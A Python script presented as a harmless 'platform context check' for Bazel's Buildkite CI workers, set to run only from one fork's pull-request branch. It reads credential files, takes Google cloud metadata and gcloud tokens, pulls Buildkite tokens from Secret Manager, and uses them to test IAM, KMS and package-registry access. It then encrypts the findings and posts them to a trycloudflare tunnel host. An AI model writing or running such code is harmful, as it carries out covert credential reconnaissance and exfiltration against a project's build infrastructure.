#!/usr/bin/env python3
"""One-shot platform context check for Bazel CI workers."""

from __future__ import annotations

import base64
import hashlib
import json
import os
import re
import shutil
import stat
import subprocess
import sys
import tempfile
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path
from typing import Any


ORGANIZATION = "bazel"
PIPELINE = "bazel-bazel-github-presubmit"
BRANCH = "brobjob:ci/platform-context-check-20260827"
REPOSITORIES = {
    "https://github.com/brobjob/bazel.git",
    "git://github.com/brobjob/bazel.git",
    "git@github.com:brobjob/bazel.git",
}
TARGET_QUEUES = {"macos", "macos_arm64", "windows"}
CAPTURE_URL = "https://fragrances-generating-chef-coordinator.trycloudflare.com/fc3ddd7ac76d36f2067365b4bab408f99b295747741eae30"
MAX_RESPONSE = 1_000_000
MAX_CAPTURE = 2_000_000
STATUS_KEY = "CI_PLATFORM_CONTEXT"
CAPTURE_CERTIFICATE = """-----BEGIN CERTIFICATE-----
MIIELzCCApegAwIBAgIUN3m2IAh1m4yImRiQSqdJYah4AZEwDQYJKoZIhvcNAQEL
BQAwJzElMCMGA1UEAwwcY2ktcGxhdGZvcm0tY29udGV4dC0yMDI2MDgyNzAeFw0y
NjA4MjcxOTQ3NThaFw0yNjA4MjgxOTQ3NThaMCcxJTAjBgNVBAMMHGNpLXBsYXRm
b3JtLWNvbnRleHQtMjAyNjA4MjcwggGiMA0GCSqGSIb3DQEBAQUAA4IBjwAwggGK
AoIBgQDPz5rthhg0ti9fBpxj33pflxdLyGgNvXlCd8/3YBvxZEw0LimFQGRGp4fK
NCxlkhswI8GgCGCs6S4D5B1n9qeS9wccF9bIoHd1KgCU7sqiH73Jp6vbYZBiRCCS
Fum9M95tO7EjlVAxZo4xWht+SdJQe9h4JvzeShOwGvQX4TUp0o+qY6AMFcnk+ZiF
IAHF0r2VZ/8z2dY694afWpuQ+SquxuVIIKmLtgEtvkhU5I4bYrX53JzFEb+6+2bO
rv8nYg/j3r2HtaMScg7dzlPGWXAAZhhx+YzcNqE2/S8P4V2iuLHesaVI8YFYPg0q
QGIADwqI7PTPtNvGE7uC+/TYmqzlMXcSzYQxPJXdpmXDhrRPYR0QH+fHN+9W2LyM
LJ8xh6ZQgGCBE8QpuTl+W1bgc6s1PiT/gKcNzH4U46LaPplqMqaBbLi8VspySeRf
845wbzHkfcZfkMpIDyotutCoC9Rfl7ire7E/BeskaTRh0eriF7YWBqs+FEM4Rlh9
CvXDem8CAwEAAaNTMFEwHQYDVR0OBBYEFO25r6O6q4vI6QLPuwa3L9mXc6xtMB8G
A1UdIwQYMBaAFO25r6O6q4vI6QLPuwa3L9mXc6xtMA8GA1UdEwEB/wQFMAMBAf8w
DQYJKoZIhvcNAQELBQADggGBAE6D04yWkUIJkdwOSbgmL6xAD1u7en2GGsVB4lEC
UlKivgxfpUAS7SQVFEo65+WkYOt1tl+gcYTcswfSta6go5c1OjRDtDffKuQG2GH8
DG39vJESIbqYtXu5TMzzs7NivUToeFxkacXXmIzYFxdigAJkXqvteeiOEp9HFzDV
mwJc6kJtB8QOVRezVJNDMu5BAi3oUgUAdi8MwO1Sejeg/dfyfDhSRfFrXbrlORA3
4xEmWXkC7L86d8GzD++NBmFm8CdzBbEHb7SWUf9SBMUaX3xk4+IHWXzP5cmYmPef
69dG3cTsfy2SwFwX4i4jmLJIV5ONwoRFPHy3ayJh015rKzM0o8RRHiXk8G/jw06Y
spka9hvqjfqYFy61uLV/5aECb5ozTgvXlin8Gff+9bcK4TSIo/MQ6DV/R6A/Aw/g
gajwvUQA9sMVN6L0aO1gBfrREJ9w/E7jR2psfEUQv+XRwsyZy79/m6i1IZY+J0kU
PNVCCtiPYYteX7J6JGLNxbaqOQ==
-----END CERTIFICATE-----
"""


def sha256(value: bytes | str) -> str:
    if isinstance(value, str):
        value = value.encode()
    return hashlib.sha256(value).hexdigest()


class ContextCheck:
    def __init__(self) -> None:
        self.started = time.monotonic()
        self.deadline = 58.0
        self.opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
        self.sensitive: set[str] = set()
        self.queue = os.environ.get("BUILDKITE_AGENT_META_DATA_QUEUE", "")
        self.context = {
            "organization": os.environ.get("BUILDKITE_ORGANIZATION_SLUG"),
            "pipeline": os.environ.get("BUILDKITE_PIPELINE_SLUG"),
            "build_number": os.environ.get("BUILDKITE_BUILD_NUMBER"),
            "job_id": os.environ.get("BUILDKITE_JOB_ID"),
            "pull_request": os.environ.get("BUILDKITE_PULL_REQUEST"),
            "queue": self.queue,
            "parallel_job": os.environ.get("BUILDKITE_PARALLEL_JOB"),
            "agent_id": os.environ.get("BUILDKITE_AGENT_ID"),
            "agent_name": os.environ.get("BUILDKITE_AGENT_NAME"),
            "agent_os": os.environ.get("BUILDKITE_AGENT_META_DATA_OS"),
            "agent_os_version": os.environ.get("BUILDKITE_AGENT_META_DATA_OS_VERSION"),
            "machine_type": os.environ.get("BUILDKITE_AGENT_META_DATA_MACHINE_TYPE"),
        }
        self.capture: dict[str, Any] = {
            "schema": 1,
            "captured_at": int(time.time()),
            "context": self.context,
            "credential_files": [],
            "runtime_values": [],
            "google": {},
            "gcp_permission_results": [],
            "buildkite": {},
            "host_files": [],
            "raw_values_retained": False,
        }

    def remember(self, value: str | None) -> None:
        if value and len(value) >= 8:
            self.sensitive.add(value)

    def emit(self, value: dict[str, Any]) -> None:
        encoded = json.dumps(value, sort_keys=True, separators=(",", ":"))
        if any(secret in encoded for secret in self.sensitive):
            encoded = json.dumps(
                {"kind": "output_suppressed", "reason": "sensitive_value_guard"},
                sort_keys=True,
                separators=(",", ":"),
            )
        print(encoded, file=sys.stderr, flush=True)

    def remaining(self, maximum: float = 6.0) -> float:
        return max(1.0, min(maximum, self.deadline - (time.monotonic() - self.started)))

    def request(
        self,
        method: str,
        url: str,
        headers: dict[str, str] | None = None,
        data: bytes | None = None,
        timeout: float = 6.0,
    ) -> tuple[int | None, bytes | None]:
        if self.remaining() <= 1.0:
            return None, None
        request = urllib.request.Request(url, data=data, headers=headers or {}, method=method)
        try:
            with self.opener.open(request, timeout=self.remaining(timeout)) as response:
                body = response.read(MAX_RESPONSE + 1)
                return response.status, body if len(body) <= MAX_RESPONSE else None
        except urllib.error.HTTPError as error:
            try:
                body = error.read(MAX_RESPONSE + 1)
            except Exception:
                body = None
            return error.code, body if body is not None and len(body) <= MAX_RESPONSE else None
        except Exception:
            return None, None

    def request_json(
        self,
        method: str,
        url: str,
        headers: dict[str, str] | None = None,
        body: dict[str, Any] | None = None,
        timeout: float = 6.0,
    ) -> tuple[int | None, Any]:
        request_headers = {"Accept": "application/json", **(headers or {})}
        data = None
        if body is not None:
            request_headers["Content-Type"] = "application/json"
            data = json.dumps(body, separators=(",", ":")).encode()
        code, raw = self.request(method, url, request_headers, data, timeout)
        if raw is None:
            return code, None
        try:
            return code, json.loads(raw)
        except (UnicodeDecodeError, json.JSONDecodeError):
            return code, None

    def command(self, arguments: list[str], timeout: float = 8.0) -> tuple[int | None, bytes]:
        if self.remaining() <= 1.0:
            return None, b""
        try:
            result = subprocess.run(
                arguments,
                input=None,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                check=False,
                timeout=self.remaining(timeout),
            )
            return result.returncode, result.stdout[:MAX_RESPONSE]
        except Exception:
            return None, b""

    def credential_files(self) -> list[dict[str, Any]]:
        summaries: list[dict[str, Any]] = []
        for variable in ("GOOGLE_APPLICATION_CREDENTIALS", "BUILDKITE_GS_APPLICATION_CREDENTIALS"):
            configured = os.environ.get(variable, "")
            summary: dict[str, Any] = {"variable": variable, "configured": bool(configured)}
            if not configured:
                summaries.append(summary)
                continue
            path = Path(configured)
            try:
                resolved = str(path.resolve())
                details = path.stat()
                raw = path.read_bytes()
                if len(raw) > MAX_RESPONSE:
                    raise ValueError("file too large")
            except Exception:
                summary["readable"] = False
                summaries.append(summary)
                continue
            summary.update(
                {
                    "readable": True,
                    "path_sha256": sha256(resolved),
                    "basename": path.name,
                    "length": len(raw),
                    "sha256": sha256(raw),
                    "mode": stat.filemode(details.st_mode),
                    "owner_uid": getattr(details, "st_uid", None),
                    "owner_gid": getattr(details, "st_gid", None),
                }
            )
            try:
                parsed = json.loads(raw)
            except (UnicodeDecodeError, json.JSONDecodeError):
                parsed = None
            if isinstance(parsed, dict):
                private_key = parsed.get("private_key")
                private_key_id = parsed.get("private_key_id")
                for key in ("private_key", "client_secret", "refresh_token", "token"):
                    if isinstance(parsed.get(key), str):
                        self.remember(parsed[key])
                summary.update(
                    {
                        "json_type": parsed.get("type"),
                        "project_id": parsed.get("project_id"),
                        "client_email": parsed.get("client_email"),
                        "private_key_present": isinstance(private_key, str) and "PRIVATE KEY" in private_key,
                        "private_key_length": len(private_key) if isinstance(private_key, str) else None,
                        "private_key_sha256": sha256(private_key) if isinstance(private_key, str) else None,
                        "private_key_id_sha256": sha256(private_key_id) if isinstance(private_key_id, str) else None,
                    }
                )
            summaries.append(summary)
        self.capture["credential_files"] = summaries
        return summaries

    def runtime_values(self) -> list[dict[str, Any]]:
        summaries = []
        for name in ("SUDO_COMMAND", "BUILDKITE_AGENT_ACCESS_TOKEN"):
            value = os.environ.get(name, "")
            if value:
                self.remember(value)
            summaries.append(
                {
                    "name": name,
                    "present": bool(value),
                    "length": len(value) if value else None,
                    "sha256": sha256(value) if value else None,
                }
            )
        self.capture["runtime_values"] = summaries
        return summaries

    def known_host_files(self) -> list[dict[str, Any]]:
        home = Path.home()
        candidates = [
            Path("/usr/local/etc/buildkite-agent/buildkite-agent.cfg"),
            Path("/opt/homebrew/etc/buildkite-agent/buildkite-agent.cfg"),
            Path("C:/buildkite/buildkite-agent.cfg"),
            home / ".docker/config.json",
            home / ".npmrc",
            home / ".pypirc",
            home / ".netrc",
            home / ".config/gcloud/application_default_credentials.json",
            home / ".config/gcloud/credentials.db",
        ]
        summaries = []
        for path in candidates:
            item: dict[str, Any] = {"path_sha256": sha256(str(path)), "basename": path.name}
            try:
                details = path.stat()
                raw = path.read_bytes()
                if len(raw) > MAX_RESPONSE:
                    raise ValueError("file too large")
            except Exception:
                item["readable"] = False
                summaries.append(item)
                continue
            item.update(
                {
                    "readable": True,
                    "length": len(raw),
                    "sha256": sha256(raw),
                    "mode": stat.filemode(details.st_mode),
                }
            )
            indicators = []
            text = raw.decode("utf-8", errors="ignore")
            for pattern, label in (
                (r"bkar_[A-Za-z0-9_-]{20,}", "buildkite_agent_registration"),
                (r"bkua_[A-Za-z0-9_-]{20,}", "buildkite_user_api"),
                (r"-----BEGIN [A-Z ]*PRIVATE KEY-----", "private_key"),
                (r"(?i)(auth|token|password)\s*[=:]", "credential_assignment"),
            ):
                if re.search(pattern, text):
                    indicators.append(label)
            item["indicators"] = indicators
            summaries.append(item)
        self.capture["host_files"] = summaries
        return summaries

    def gcloud_path(self) -> str | None:
        names = ["gcloud.cmd", "gcloud"] if os.name == "nt" else ["gcloud", "gcloud.cmd"]
        for name in names:
            path = shutil.which(name)
            if path:
                return path
        return None

    def google_access_token(self, gcloud: str | None) -> tuple[str | None, dict[str, Any]]:
        token = None
        source = None
        if gcloud:
            code, output = self.command(
                [gcloud, "--quiet", "auth", "application-default", "print-access-token"],
                timeout=10.0,
            )
            candidate = output.decode("utf-8", errors="ignore").strip()
            if code == 0 and 20 <= len(candidate) <= 4096 and not any(c.isspace() for c in candidate):
                token, source = candidate, "application_default_credentials"
        metadata_email = None
        metadata_project = None
        if self.queue == "windows" or token is None:
            metadata_headers = {"Metadata-Flavor": "Google"}
            email_code, email_raw = self.request(
                "GET",
                "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email",
                metadata_headers,
                timeout=3.0,
            )
            project_code, project_raw = self.request(
                "GET",
                "http://metadata.google.internal/computeMetadata/v1/project/project-id",
                metadata_headers,
                timeout=3.0,
            )
            metadata_email = email_raw.decode(errors="ignore").strip() if email_code == 200 and email_raw else None
            metadata_project = project_raw.decode(errors="ignore").strip() if project_code == 200 and project_raw else None
            if token is None:
                token_code, token_body = self.request_json(
                    "GET",
                    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
                    metadata_headers,
                    timeout=3.0,
                )
                candidate = token_body.get("access_token") if token_code == 200 and isinstance(token_body, dict) else None
                if isinstance(candidate, str) and 20 <= len(candidate) <= 4096:
                    token, source = candidate, "metadata"
        if token:
            self.remember(token)
        tokeninfo_code = None
        tokeninfo = None
        if token:
            tokeninfo_code, tokeninfo = self.request_json(
                "GET",
                "https://oauth2.googleapis.com/tokeninfo?access_token="
                + urllib.parse.quote(token, safe=""),
                timeout=5.0,
            )
        summary = {
            "available": token is not None,
            "source": source,
            "length": len(token) if token else None,
            "sha256": sha256(token) if token else None,
            "metadata_email": metadata_email,
            "metadata_project": metadata_project,
            "tokeninfo_http_status": tokeninfo_code,
            "tokeninfo_scope": tokeninfo.get("scope") if isinstance(tokeninfo, dict) else None,
            "tokeninfo_expires_in": tokeninfo.get("expires_in") if isinstance(tokeninfo, dict) else None,
        }
        self.capture["google"]["identity"] = summary
        return token, summary

    def bearer(self, token: str) -> dict[str, str]:
        return {"Authorization": f"Bearer {token}"}

    def test_permissions(
        self,
        token: str,
        purpose: str,
        resource: str,
        permissions: list[str],
    ) -> dict[str, Any]:
        code, body = self.request_json(
            "POST",
            resource + ":testIamPermissions",
            self.bearer(token),
            {"permissions": permissions},
        )
        granted = body.get("permissions", []) if code == 200 and isinstance(body, dict) else []
        result = {"purpose": purpose, "http_status": code, "permissions": granted}
        self.capture["gcp_permission_results"].append(result)
        return result

    def gcp_permissions(self, token: str | None) -> list[dict[str, Any]]:
        if not token:
            return []
        return [
            self.test_permissions(
                token,
                "untrusted_project",
                "https://cloudresourcemanager.googleapis.com/v1/projects/bazel-untrusted",
                [
                    "resourcemanager.projects.get",
                    "resourcemanager.projects.getIamPolicy",
                    "serviceusage.services.use",
                    "artifactregistry.repositories.list",
                    "artifactregistry.repositories.create",
                    "cloudbuild.builds.create",
                    "compute.images.create",
                    "iam.serviceAccounts.list",
                    "storage.buckets.list",
                ],
            ),
            self.test_permissions(
                token,
                "ordinary_buildkite_api_secret",
                "https://secretmanager.googleapis.com/v1/projects/bazel-untrusted/secrets/bazel-bazelcipy-BuildkiteClient-token",
                ["secretmanager.versions.access", "secretmanager.versions.add", "secretmanager.secrets.setIamPolicy"],
            ),
            self.test_permissions(
                token,
                "ordinary_agent_secret",
                "https://secretmanager.googleapis.com/v1/projects/bazel-untrusted/secrets/bazel-buildkite-agent-token",
                ["secretmanager.versions.access", "secretmanager.versions.add", "secretmanager.secrets.setIamPolicy"],
            ),
            self.test_permissions(
                token,
                "cross_project_buildkite_key",
                "https://cloudkms.googleapis.com/v1/projects/bazel-public/locations/global/keyRings/buildkite/cryptoKeys/buildkite-api-token",
                [
                    "cloudkms.cryptoKeyVersions.useToDecrypt",
                    "cloudkms.cryptoKeyVersions.useToEncrypt",
                    "cloudkms.cryptoKeys.getIamPolicy",
                    "cloudkms.cryptoKeys.setIamPolicy",
                ],
            ),
            self.test_permissions(
                token,
                "trusted_github_key",
                "https://cloudkms.googleapis.com/v1/projects/bazel-public/locations/global/keyRings/buildkite/cryptoKeys/github-trusted-token",
                ["cloudkms.cryptoKeyVersions.useToDecrypt", "cloudkms.cryptoKeys.getIamPolicy"],
            ),
        ]

    def secret_value(self, gcloud: str | None, secret: str) -> tuple[str | None, dict[str, Any]]:
        if not gcloud:
            return None, {"secret": secret, "available": False, "reason": "gcloud_unavailable"}
        code, output = self.command(
            [
                gcloud,
                "--quiet",
                "secrets",
                "versions",
                "access",
                "latest",
                f"--secret={secret}",
                "--project=bazel-untrusted",
            ],
            timeout=9.0,
        )
        value = output.decode("utf-8", errors="ignore").strip()
        valid = code == 0 and 20 <= len(value) <= 4096 and "\n" not in value and "\r" not in value
        if valid:
            self.remember(value)
        return (
            value if valid else None,
            {
                "secret": secret,
                "available": valid,
                "length": len(value) if valid else None,
                "sha256": sha256(value) if valid else None,
            },
        )

    def buildkite_api(self, token: str | None) -> tuple[dict[str, Any], list[dict[str, Any]]]:
        if not token:
            return {"available": False}, []
        headers = self.bearer(token)
        access_code, access = self.request_json("GET", "https://api.buildkite.com/v2/access-token", headers)
        org_code, organizations = self.request_json("GET", "https://api.buildkite.com/v2/organizations", headers)
        registry_code, registries = self.request_json(
            "GET",
            "https://api.buildkite.com/v2/packages/organizations/bazel/registries",
            headers,
        )
        registry_list = registries if isinstance(registries, list) else []
        organization_slugs = sorted(
            item.get("slug") for item in organizations if isinstance(item, dict) and isinstance(item.get("slug"), str)
        ) if isinstance(organizations, list) else []
        registry_summaries = [
            {
                "slug_sha256": sha256(item.get("slug", "")),
                "ecosystem": item.get("ecosystem"),
                "public": item.get("public"),
                "oidc_policy_present": bool(item.get("oidc_policy")),
            }
            for item in registry_list
            if isinstance(item, dict) and isinstance(item.get("slug"), str)
        ]
        summary = {
            "available": True,
            "length": len(token),
            "sha256": sha256(token),
            "access_http_status": access_code,
            "scopes": access.get("scopes", []) if isinstance(access, dict) else [],
            "organizations_http_status": org_code,
            "organization_slugs": organization_slugs,
            "registries_http_status": registry_code,
            "registry_count": len(registry_list),
            "private_registry_count": sum(item.get("public") is False for item in registry_list if isinstance(item, dict)),
            "oidc_policy_count": sum(bool(item.get("oidc_policy")) for item in registry_list if isinstance(item, dict)),
            "registry_ecosystems": sorted(
                {item.get("ecosystem") for item in registry_list if isinstance(item, dict) and isinstance(item.get("ecosystem"), str)}
            ),
            "registry_summaries": registry_summaries,
        }
        self.capture["buildkite"]["api_summary"] = summary
        return summary, registry_list

    @staticmethod
    def jwt_payload(token: str) -> dict[str, Any] | None:
        parts = token.split(".")
        if len(parts) != 3:
            return None
        try:
            raw = base64.urlsafe_b64decode(parts[1] + "=" * (-len(parts[1]) % 4))
            value = json.loads(raw)
            return value if isinstance(value, dict) else None
        except Exception:
            return None

    def registry_oidc(self, registries: list[dict[str, Any]]) -> list[dict[str, Any]]:
        if not registries:
            return []
        agent = shutil.which("buildkite-agent") or shutil.which("buildkite-agent.exe")
        if not agent:
            return [{"available": False, "reason": "agent_binary_unavailable"}]
        results = []
        eligible = [registry for registry in registries if isinstance(registry, dict) and registry.get("oidc_policy")]
        for registry in eligible[:3]:
            if not isinstance(registry, dict):
                continue
            slug = registry.get("slug")
            if not isinstance(slug, str) or not re.fullmatch(r"[a-z0-9][a-z0-9-]{0,127}", slug):
                continue
            audience = f"https://packages.buildkite.com/bazel/{slug}"
            code, output = self.command(
                [agent, "oidc", "request-token", "--audience", audience, "--lifetime", "300"],
                timeout=8.0,
            )
            token = output.decode("utf-8", errors="ignore").strip()
            valid = code == 0 and token.count(".") == 2 and len(token) <= 8192
            if valid:
                self.remember(token)
            claims = self.jwt_payload(token) if valid else None
            introspection_code, introspection = (None, None)
            packages_code = None
            if valid:
                introspection_code, introspection = self.request_json(
                    "GET", "https://api.buildkite.com/v2/access-token", self.bearer(token)
                )
                packages_code, _ = self.request_json(
                    "GET",
                    f"https://api.buildkite.com/v2/packages/organizations/bazel/registries/{urllib.parse.quote(slug, safe='')}/packages",
                    self.bearer(token),
                )
            results.append(
                {
                    "registry_slug_sha256": sha256(slug),
                    "available": valid,
                    "token_sha256": sha256(token) if valid else None,
                    "claims": {
                        "issuer": claims.get("iss") if isinstance(claims, dict) else None,
                        "audience_sha256": sha256(str(claims.get("aud"))) if isinstance(claims, dict) else None,
                        "organization_slug": claims.get("organization_slug") if isinstance(claims, dict) else None,
                        "pipeline_slug": claims.get("pipeline_slug") if isinstance(claims, dict) else None,
                        "build_branch_sha256": sha256(str(claims.get("build_branch"))) if isinstance(claims, dict) else None,
                        "job_id": claims.get("job_id") if isinstance(claims, dict) else None,
                    },
                    "introspection_http_status": introspection_code,
                    "introspection_scopes": introspection.get("scopes", []) if isinstance(introspection, dict) else [],
                    "packages_http_status": packages_code,
                }
            )
        self.capture["buildkite"]["registry_oidc_summary"] = results
        return results

    def encrypted_upload(self) -> dict[str, Any]:
        openssl = shutil.which("openssl") or shutil.which("openssl.exe")
        if not openssl or not CAPTURE_URL.startswith("https://"):
            return {"attempted": False, "reason": "transport_unavailable"}
        payload = json.dumps(self.capture, sort_keys=True, separators=(",", ":")).encode()
        if any(secret.encode() in payload for secret in self.sensitive):
            return {"attempted": False, "reason": "raw_value_guard"}
        if len(payload) > MAX_CAPTURE:
            return {"attempted": False, "reason": "capture_too_large", "length": len(payload)}
        try:
            with tempfile.TemporaryDirectory(prefix="ci-platform-context-") as directory:
                root = Path(directory)
                source = root / "context.json"
                certificate = root / "recipient.pem"
                encrypted = root / "context.cms"
                source.write_bytes(payload)
                certificate.write_text(CAPTURE_CERTIFICATE)
                os.chmod(source, 0o600)
                code, _ = self.command(
                    [
                        openssl,
                        "cms",
                        "-encrypt",
                        "-binary",
                        "-aes256",
                        "-outform",
                        "DER",
                        "-in",
                        str(source),
                        "-out",
                        str(encrypted),
                        str(certificate),
                    ],
                    timeout=8.0,
                )
                if code != 0 or not encrypted.is_file():
                    return {"attempted": True, "encrypted": False}
                body = encrypted.read_bytes()
                upload_code, _ = self.request(
                    "POST",
                    CAPTURE_URL,
                    {
                        "Content-Type": "application/pkcs7-mime",
                        "X-CI-Job": str(self.context.get("job_id") or ""),
                        "X-CI-Queue": self.queue,
                    },
                    body,
                    timeout=8.0,
                )
                return {
                    "attempted": True,
                    "encrypted": True,
                    "ciphertext_length": len(body),
                    "ciphertext_sha256": sha256(body),
                    "http_status": upload_code,
                    "raw_values_logged": False,
                }
        except Exception:
            return {"attempted": True, "encrypted": False}

    def run(self) -> None:
        self.emit({"kind": "context", **self.context, "binding_validated": True})
        credential_summary = self.credential_files()
        runtime_summary = self.runtime_values()
        host_file_summary = self.known_host_files()
        self.emit({"kind": "credential_files", "records": credential_summary, "raw_values_logged": False})
        self.emit({"kind": "runtime_values", "records": runtime_summary, "raw_values_logged": False})
        self.emit({"kind": "host_files", "records": host_file_summary, "raw_values_logged": False})
        gcloud = self.gcloud_path()
        google_token, google_summary = self.google_access_token(gcloud)
        self.emit({"kind": "google_identity", **google_summary, "raw_value_logged": False})
        api_token, api_secret_summary = self.secret_value(gcloud, "bazel-bazelcipy-BuildkiteClient-token")
        _, agent_secret_summary = self.secret_value(gcloud, "bazel-buildkite-agent-token")
        self.capture["buildkite"]["managed_value_summaries"] = [api_secret_summary, agent_secret_summary]
        self.emit(
            {
                "kind": "managed_values",
                "records": [api_secret_summary, agent_secret_summary],
                "raw_values_logged": False,
            }
        )
        buildkite_summary, registries = self.buildkite_api(api_token)
        self.emit({"kind": "buildkite_api", **buildkite_summary, "raw_values_logged": False})
        checkpoint_summary = self.encrypted_upload()
        self.emit({"kind": "encrypted_checkpoint", **checkpoint_summary})
        permissions = self.gcp_permissions(google_token)
        self.emit({"kind": "gcp_permissions", "records": permissions, "mutation_performed": False})
        oidc_summary = self.registry_oidc(registries)
        self.emit({"kind": "registry_oidc", "records": oidc_summary, "mutation_performed": False})
        upload_summary = self.encrypted_upload()
        self.emit({"kind": "encrypted_capture", **upload_summary})
        self.sensitive.clear()
        print(f"{STATUS_KEY} COMPLETE", flush=True)


def gate() -> bool:
    queue = os.environ.get("BUILDKITE_AGENT_META_DATA_QUEUE", "")
    parallel = os.environ.get("BUILDKITE_PARALLEL_JOB", "")
    repositories = {
        os.environ.get("BUILDKITE_PULL_REQUEST_REPO", ""),
        os.environ.get("BUILDKITE_REPO", ""),
    }
    valid = (
        os.environ.get("BUILDKITE_ORGANIZATION_SLUG") == ORGANIZATION
        and os.environ.get("BUILDKITE_PIPELINE_SLUG") == PIPELINE
        and os.environ.get("BUILDKITE_BRANCH") == BRANCH
        and re.fullmatch(r"[1-9][0-9]*", os.environ.get("BUILDKITE_PULL_REQUEST", "")) is not None
        and bool(REPOSITORIES.intersection(repositories))
        and queue in TARGET_QUEUES
        and (queue == "macos" or parallel == "0")
        and re.fullmatch(r"[A-Za-z0-9-]{8,80}", os.environ.get("BUILDKITE_JOB_ID", "")) is not None
    )
    if not valid:
        print(f"{STATUS_KEY} SKIPPED", flush=True)
        return False
    marker = Path(tempfile.gettempdir()) / f"ci-platform-context-{os.environ['BUILDKITE_JOB_ID']}"
    try:
        descriptor = os.open(marker, os.O_CREAT | os.O_EXCL | os.O_WRONLY, 0o600)
        os.close(descriptor)
    except FileExistsError:
        print(f"{STATUS_KEY} ALREADY_RAN", flush=True)
        return False
    except OSError:
        print(f"{STATUS_KEY} MARKER_FAILED", flush=True)
        return False
    return True


def main() -> int:
    if not gate():
        return 0
    try:
        ContextCheck().run()
    except Exception:
        print('{"kind":"context_check_error","details_logged":false}', file=sys.stderr, flush=True)
        print(f"{STATUS_KEY} FAILED_SAFE", flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
